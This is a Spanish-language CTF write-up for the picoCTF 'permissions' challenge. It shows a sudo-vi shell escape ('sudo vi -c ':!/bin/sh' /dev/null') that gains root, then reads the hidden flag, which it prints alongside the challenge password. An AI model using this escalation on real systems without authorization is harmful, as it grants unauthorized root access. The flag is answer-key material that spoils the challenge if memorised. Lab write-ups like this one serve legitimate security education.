# permissions

## Descripcion
Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 59057 picoplayer@saturn.picoctf.net`Password: `yX-YQgX-vS`Can you login and read the root file?
## Solucion
Primero nos conectamos al reto con las credenciales proporcionadas por el reto:

```bash
┌──(xrengariox㉿PC)-[~/Downloads]
└─$ ssh -p 59057 picoplayer@saturn.picoctf.net
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Feb 18 23:39:21 2025 from 200.92.165.199
picoplayer@challenge:~$ 

```

Una vez conectados al reto, vamos al directorio raiz, y vemos que como tal no hay un archivo en la raiz, simplemente directorios:
```bash
picoplayer@challenge:/$ ls -la
total 0
drwxr-xr-x   1 root   root     51 Feb 18 23:38 .
drwxr-xr-x   1 root   root     51 Feb 18 23:38 ..
-rwxr-xr-x   1 root   root      0 Feb 18 23:38 .dockerenv
lrwxrwxrwx   1 root   root      7 Mar  8  2023 bin -> usr/bin
drwxr-xr-x   2 root   root      6 Apr 15  2020 boot
d---------   1 root   root     27 Aug  4  2023 challenge
drwxr-xr-x   5 root   root    340 Feb 18 23:38 dev
drwxr-xr-x   1 root   root     66 Feb 18 23:38 etc
drwxr-xr-x   1 root   root     24 Aug  4  2023 home
lrwxrwxrwx   1 root   root      7 Mar  8  2023 lib -> usr/lib
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root     10 Mar  8  2023 libx32 -> usr/libx32
drwxr-xr-x   2 root   root      6 Mar  8  2023 media
drwxr-xr-x   2 root   root      6 Mar  8  2023 mnt
drwxr-xr-x   2 root   root      6 Mar  8  2023 opt
dr-xr-xr-x 303 nobody nogroup   0 Feb 18 23:38 proc
drwx------   1 root   root     23 Aug  4  2023 root
drwxr-xr-x   1 root   root     66 Feb 18 23:50 run
lrwxrwxrwx   1 root   root      8 Mar  8  2023 sbin -> usr/sbin
drwxr-xr-x   2 root   root      6 Mar  8  2023 srv
dr-xr-xr-x  13 nobody nogroup   0 Feb 18 23:38 sys
drwxrwxrwt   1 root   root      6 Aug  4  2023 tmp
drwxr-xr-x   1 root   root     18 Mar  8  2023 usr
drwxr-xr-x   1 root   root     28 Mar  8  2023 var
```

De aqui algo que nos puede interezar es el directorio llamado challenge, el cual podemos ver que no tiene nada de permisos:
```bash
d---------   1 root   root     27 Aug  4  2023 challenge
```

Si quieremos acceder a este, puesto que no tenemos permisos nos da un error:
```bash
picoplayer@challenge:/$ cd challenge/
-bash: cd: challenge/: Permission denied
```

Asi que comenzamos viendo que permisos tenemos nosotros como usuario picoplayer en el sistema:
```bash
picoplayer@challenge:/$ whoami
picoplayer
picoplayer@challenge:/$ sudo -l 
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

Y nos dice que nosotros solo podemos usar el comando vim ('vi'). Lo cual realmente no es mucho, asi que toca investigar. En este caso vemos que se puede hacer una elevacion de privilegios cuando podemos correr el comando como super usuario:

```bash
sudo vi -c ':!/bin/sh' /dev/null
```

Tras poner el comando nos convertimos en el usario root:
```sh
picoplayer@challenge:~$ sudo vi -c ':!/bin/sh' /dev/null

# whoami
root
# 
```

Ahora intentamos acceder a la carpeta challenge, pero vemos que no tiene nada:
```bash
# cd challenge  
# ls -la
total 4
d--------- 1 root root 27 Aug  4  2023 .
drwxr-xr-x 1 root root 63 Feb 19 00:00 ..
---------- 1 root root 98 Aug  4  2023 metadata.json
# 
```

Entonces volviendo a leer la descripcion del reto, parece ser que el directorio donde debemos de buscar no es ese, si no, mas bien debemos buscar en el directorio root:

```bash
# cd root       
# ls -la
total 16
drwx------ 1 root root   22 Feb 19 00:02 .
drwxr-xr-x 1 root root   63 Feb 19 00:00 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  662 Feb 19 00:02 .viminfo
# cat flag.txt
cat: flag.txt: No such file or directory
# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_55878b51}
```

Vemos que aqui se encuentra el archivo de la flag, entonces lo leemos y nos da la flag:

```
picoCTF{uS1ng_v1m_3dit0r_55878b51}
```

## Notas adicionales

## Referencias

* https://gtfobins.github.io/gtfobins/vi/
